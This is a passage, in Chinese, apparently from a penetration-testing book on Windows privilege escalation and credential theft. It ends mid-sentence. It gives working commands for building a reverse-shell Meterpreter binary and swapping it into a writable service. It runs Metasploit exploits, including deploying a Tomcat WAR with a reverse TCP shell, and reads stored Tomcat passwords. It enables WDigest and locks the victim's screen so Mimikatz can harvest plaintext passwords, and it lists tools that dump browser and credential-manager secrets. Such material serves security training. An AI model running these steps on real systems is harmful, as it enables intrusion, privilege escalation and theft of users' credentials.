寻找 BINARY_PATH_NAME
查找服务中存在的不安全的注册表权限:
识别允许更新服务映像路径位置的弱权限账户
检查 AlwaysInstallElevated 注册表项是否已启用：
检查 AlwaysInstallElevated 注册表项，该注册表项指示.msi 文件应以较高的权限 ( NT AUTHORITY\SYSTEM )
安装
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/always_i
nstall_elevated.rb
请注意，我们并不需要手动完成这些操作，因为别人已经创建了一些好的 metasploit 和 PowerShell 模块，特别是针
对 Windows 的模块。在下面的示例中，我们将查看 PowerUp PowerShell 脚本。在这种情况下，脚本与 Empire 一
起在所有常见的错误配置区域运行查找，比如允许普通用户获得本地管理或系统帐户。在下面的示例中，我们在受害
者系统上运行这个程序，发现它有一些本地系统的未引用服务路径。现在，我们可能无法重新启动服务，但我们应该
能够利用这个漏洞，等待服务重启。
Empire PowerUp 模块:
usermodule privesc/powerup/allchecks
最突出的是:
ServiceName： WavesSysSvc
Path： C:\Program Files\Waves\MaxxAudio\WavesSysSvc64.exe
ModiﬁableFile： C:\Program Files\Waves\MaxxAudio\WavesSysSvc64.exe
ModiﬁableFilePermissions： {WriteOwner, Delete, WriteAttributes, Synchronize…}
ModiﬁableFileIdentityReference： Everyone
StartName： LocalSystem
看起来任何人都可以编写 WavesSysSyc 服务。这意味着我们可以将 WaveSysSvc64.exe 文件替换为我们自己的恶意
二进制文件:
创建一个 Meterpreter 二进制文件（后续的文章将讨论如何绕过杀毒软件）
msfvenom -p windows/meterpreter/reverse_https LHOST=[ip] LPORT=8080 -f exe > shell.exe
使用 Empire 上传二进制文件并替换原始二进制文件
upload ./shell.exe C:\users\test\shell.exe
shell copy C:\users\test\Desktop\shell.exe “C:\ProgramFiles\Waves\MaxxAudio\WavesSysSvc64.exe”
重新启动服务或等待其重启
一旦服务重新启动，你你应该会收到一个升级为 system  权限的 Meterpreter shell 。使用 PowerUp  powershell 脚
本，你将发现许多不同的服务都会有权限提升的可能性。如果你想深入了解 Windows 权限提升的底层问题，请查看
FuzzSecurity 的文章：http://www.fuzzysecurity.com/tutorials/16.html 。
对于未打补丁的 Windows 系统，我们确实有一些权限升级攻击，比如：（ https://github.com/FuzzySecurity/Pow
erShell-Suite/blob/master/Invoke-MS16-032.ps1 ）和 ( https://github.com/FuzzySecurity/PSKernel-Primitives/t
ree/master/Sample-Exploits/MS16-135 ），但是我们如何快速识别目标系统上安装了哪些补丁呢，我们可以在受
害者系统上使用系统默认自带的命令来查看安装了哪些系统补丁包。Windows 自带默认命令 systeminfo  将提取任
何给定的 Windows 主机的所有补丁安装历史记录。我们可以拿回这个输出结果，将其复制到我们的 Kali 系统并运行
Windows Exploit Suggester 以查找已知的漏洞然后针对性的进行漏洞利用从而提升权限。
回到你攻击的 Windows 10系统：
systeminfo
systeminfo > windows.txt
将 windows.txt 复制到你的 Kali 虚拟机的 /opt/Windows-Exploit-Suggester 下
python ./windows-exploit-suggester.py -i ./windows.txt -d 2018-03-21-mssb.xls
这个工具已经有一段时间没有被维护了，但是你还是可以轻松地从中寻找到你正需要的能权限提升的漏洞。
如果我们处在一个已经打好所有补丁的 Windows 主机环境中，我们将重点关注第三方软件中的不同权限提升漏洞或
操作系统的任何 0day 漏洞。例如，我们一直在寻找下面这样的漏洞 http://bit.ly/2HnX5id ，这是 Windows 中的权
限升级漏洞，现在还没有修补。通常在这些场景中，可能会有一些基本的 POC 代码，但是我们需要测试、验证并多
次复现这个漏洞。我们经常监控某些领域存在公共特权升级的漏洞：
http://insecure.org/search.html?q=privilege%20escalation
https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=escalation&colspec=ID+Type+Status+Prio
rity+Milestone+Owner+Summary&cells=ids
通常，这只是时间问题。例如，当发现漏洞时，这可能是你在系统打好补丁之前进一步破坏系统有限的好机会。
权限提升实验
测试并尝试不同类型的权限升级漏洞的最佳实验环境是 Rapid7的 Metasploitable3。这个充满漏洞的框架会自动生
成一个 Windows 虚拟机，其中包含所有常见的和不常见的漏洞。配置需要一点时间，但是一旦配置好了虚拟机，它
就是一个非常棒的实验环境。
让我们来看一个简单的例子，然后快速开始：
使用 nmap 扫描 Metasploitable3 虚拟机的IP ( 确保全端口扫描免得你错过一些端口 )
你将看到 ManageEngine 在端口8383上运行
启动 Metasploit 并搜索任何 ManageEngine 有关的漏洞
msfconsole
search manageengine
use exploit/windows/http/manageengine_connectionid_write
set SSL True
set RPORT 8383
set RHOST 
exploit
getsystem
你会注意到你不能获得 system  权限，因为你所利用的服务未作为特权进程运行。这时，你能做到的就是尝试
所有不同的权限提升攻击。
其中，我们看到的一件事是，Apache Tomcat 是作为特权进程运行的。如果我们可以利用这个服务，我们就可
以将我们的 payload 作为更高层次的服务运行。我们看到 Apache Tomcat 在外部网络的8282端口运行，但它
需要用户名和密码。因为我们有一个本地低权限的 shell，我们可以尝试在磁盘上搜索这个密码。我们可以在谷
歌搜索“Tomcat密码存储在哪里”，搜索结果表明：“tomcat-users.xml”。
在受害者机器中，我们可以搜索和读取 tomcat-users.xml 文件:
shell
cd \ && dir /s tomcat-users.xml
type “C:\Program Files\Apache Software Foundation\tomcat\apache-tomcat-8.0.33\conf\tomcat-
users.xml
现在让我们使用找到的密码攻击 Tomcat。首先，登录到8282端口上的 Tomcat 管理控制台，并查看我们的密
码是否有效。然后，我们可以使用 Metasploit 通过 Tomcat 部署恶意的 WAR 文件。
search tomcat
use exploit/multi/http/tomcat_mgr_upload
show options
set HTTPusername sploit
set HTTPpassword sploit
set RPORT 8282
set RHOST 
set Payload java/shell_reverse_tcp
set LHOST 
exploit
whoami
你现在应该是 system  权限了。我们利用第三方的工具（tomcat）来提升权限到 system  权限。
从内存中提取明文凭据
Mimikatz 自推出以来，就改变了在渗透入侵中获取明文密码的方式。在 Windows 10之前，以本地管理员的身份在
主机系统上运行 Mimikatz 的话是允许攻击者从 lsass（本地安全机构子系统服务）中提取明文密码的。这种方法在
Windows 10 出现之前非常有效，而在 windows 10 中，即使你是本地管理员，也无法直接读取它。现在，我看到了
一些奇怪的现象，其中单点登录（ SSO ）或者一些特殊的软件会把密码保存在 LSASS 进程中让 Mimikatz 读取，但
是我们现在先忽略这个。在这一章中，我们将讨论当这件方法（指 SSO 和特殊的软件）不工作时该做什么（比如在
Windows 10系统中）。
假设你攻击了 Windows 10系统的主机并且提升权限了，默认情况下，你将调整 Mimikatz 的配置，并根据下面的查
询查看到密码字段为空。
那么你能做什么呢？最简单的选项是设置注册表项以让系统将密码凭证保存到 LSASS 进程。在 HKLM 中，有一个
UseLogonCredential 设置，如果设置为0，系统将在内存中存储凭据（ http://bit.ly/2vhFBiZ ）：
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t
REG_DWORD /d 1 /f
在 Empire 中，我们可以通过 shell 命令运行：
shell reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v
UseLogonCredential /t REG_DWORD /d 1 /f
这个注册表修改的问题就是需要用户重新登录到系统。你可以让目标机器屏幕锁屏、重新启动或注销用户，以便你能
够捕获然后再次发送凭证文本。最简单的方法是锁定他们的工作机器（这样他们就不会丢失他们的当前的工作...看看
我有多好！）。要触发锁屏：
rundll32.exe user32.dll，LockWorkStation
一旦我们锁定屏幕，并让它们重新登录，我们就可以重新运行 Mimikatz 来获得明文密码。
如果我们无法提升到本地管理帐户怎么办？我们还有哪些其他方法可以获得用户的凭证？在过去，一个常见的渗透攻
击是在客户机的用户空间内存中查看凭据是否以明文形式存储。现在一切都是基于浏览器的，我们能在浏览器中做同
样的事情吗？
在这里，putterpanda 将和一个很酷的 POC 工具在一起来完成这个任务，称为 Mimikittenz。Mimikittenz 所做的就
是利用 Windows 函数 ReadProcessMemory()来提取来自各种目标进程（如浏览器）的密码，并输出纯文本。
Mimikitten 支持 Gmail，Oﬃce365，Outlook Web，Jira，Github，Bugzilla，Zendesk，Cpanel，Dropbox，
Microsoft OneDrive，AWS Web 服务、Slack、Twitter 和 Facebook。编写 Mimimikittenz 搜索表达式也很容易。
这个工具最好的地方在于它不需要本地管理员权限，因为他只需要访问那些用户本身创建的进程。一旦我们攻击进了
主机，我们将把 Mimimikittenz 导入内存，并运行 Invoke-mimikittenz 脚本。
正如上面所看到的，用户通过 Firefox 登录到 Github 中，我们可以从浏览器内存中提取他们的用户名和密码。现
在，我希望这本书的读者都能把这个工具用的越来越高级，为不同的应用程序创建更多的搜索查询。
从 Windows 凭据管理器和浏览器获取密码
Windows 凭据管理器是 Windows 的默认功能，用于保存系统、网站和服务器的用户名、密码和证书。记不记得当
你使用 Microsoft IE/EDGE 对网站进行身份验证后，通常会弹出一个弹出窗口，询问“是否要保存密码？”凭证存储就
是存储这些信息的地方，在凭据管理器中，有两种类型的凭据：Web 和 Windows。你还记得哪个用户有权访问这些
数据吗？它不是 system ，而是登录后可以检索此信息的用户。这对我们来说是很好的，就像任何钓鱼网站或代码执
行一样，我们通常都可以用别的方法获得那个用户的权限。最好的一点是，我们甚至不需要成为本地管理员来提取这
些数据。
如何提取这些信息呢？我们可以使用两种不同的 PowerShell 脚本导入以收集此数据：
收集网络凭据：
https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
收集 Windows 凭证（只收集通用的而不是目标域特有的）：
https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1
从上图中可以看到，我们提取了他们的 Facebook 存储的凭证和任何他们拥有通用的凭证。记住，对于 Web 凭据，